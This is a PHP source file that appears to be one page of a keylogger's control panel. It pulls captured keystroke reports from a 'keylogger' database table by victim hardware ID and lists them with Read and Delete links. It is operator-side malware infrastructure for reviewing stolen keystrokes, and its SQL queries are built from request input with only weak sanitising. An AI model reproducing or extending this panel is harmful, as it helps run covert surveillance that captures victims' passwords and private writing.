<?php include('header.php'); ?>


<?php

function safe_id($data){

    $data =  trim($data);
    $data =  strip_tags($data);
    $data =  htmlspecialchars($data);
    $data =  addslashes($data);
    
    return $data;
  }
  
$hwid = safe_id($_GET['hwid']);


if(!isset($_GET['page'])){
    
 
    $page = 1;
  
  }
  else {
  
   //$hid1 = $hwid; 
   $page = (int)$_GET['page'];
  
  }
  



  $post_at_page = 20;//عدد البوستات التي يعرضها في كل صفحة
  $query_post_count = mysqli_query($condb,"SELECT * FROM `keylogger`");
  $query_count = mysqli_num_rows($query_post_count);
  mysqli_free_result($query_post_count);
  
   //get hwid 
   $q_hwid = mysqli_query($condb,"SELECT * FROM `keylogger` WHERE HWID='$hwid'");
   $get_a = @mysqli_fetch_array($q_hwid);
   $hid = $get_a['HWID'];


  $query_count = (int)ceil($query_count / $post_at_page);
          
  /*تحقق ن إدا كانت المدخلات في بارميتر page*/		
  if(($page > $query_count)||($page <= 0)){
   echo '<blockquote>';
    echo '<p>Error This page was not found <p/>';
    echo '  <footer>Click on the Previous page to go back  </cite></footer>';
  echo '</blockquote>';
  }		
  $start = ($page - 1) * $post_at_page;
  $end = $post_at_page;
  $querypost="SELECT * FROM `keylogger` WHERE HWID='$hwid' ORDER BY `ID_k` DESC LIMIT $start,$end";
  $result=mysqli_query($condb,$querypost);
  echo '</div> <div class="row">
             <div class="col-md-12 text-center" >

             <div class="table-responsive" style="background-image: linear-gradient(to bottom,#232323 0,#232323 100%);">
             <table class="table table-bordered table-hover">								 
               <tr>
               <td class="col-md-2">HWID</td>
               <td class="col-md-2">Report Date</td>
               <td class="col-md-2">Action</td>
               </tr>';

  while($rows=@mysqli_fetch_array($result))
     {
        echo'<tr>
                <td class="col-md-2">'.$rows['HWID'].'</td>
                <td class="col-md-2">'.$rows['Keylog_date'].'</td>
                <td class="col-md-2" style="padding-bottom: 12px;">
                    <a class="btn-edit" style="margin-right: 5px;" target="_blank" href="show.php?id='.$rows['ID_k'].'"> Read </a>
                    <a class="btn-delete" href="delete.php?id='.$rows['ID_k'].'"> Delete </a>
                </td>
          </tr>';	

    }
    echo  '</table></div>
         </div>
      </div>';


  echo '<div class="row">
      <div class="col-md-12 text-center">
        <nav>
            <ul class="pager">
              <li><a href="?hwid='.$hwid.'&page='.($page-1).'" class="hvr-icon-forward" style="color: #000;"><span class="fa fa-chevron-circle-left hvr-icon"></span>Prev </a></li>
              <li><a href="?hwid='.$hwid.'&page='.($page+1).'" class="hvr-icon-back hvr-icon-forward" style="color: #000;">Next <span class="fa fa-chevron-circle-right hvr-icon" ></span></a></li>
            </ul>
        </nav>
      </div>
  </div>';
               
  















?>




<?php include('footer.php'); ?>